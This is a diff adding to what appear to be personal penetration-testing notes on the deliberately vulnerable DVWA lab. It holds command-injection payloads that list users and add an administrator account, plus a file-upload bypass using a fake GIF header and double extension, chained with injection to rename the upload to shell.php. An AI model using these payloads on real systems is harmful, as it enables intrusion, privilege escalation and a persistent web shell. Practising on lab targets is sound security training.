@@ -447,4 +447,11 @@ python -m SimpleHTTPServer
   (| net user)
   (| net localgroup Administrators Test_user /Add)
   
+File Upload Vul::
+file.php
+File.php.jpg
+Add GIF98 and upload and rename .php.jgp
+
+  Chain attack to execute, go in Command SHell and |copy c:\wamp64\www\DVWA\hackable\uploads\filename.php.jpg c:\wamp64\www\DVWA\hackable\uploads\shell.php
+  
 </details>
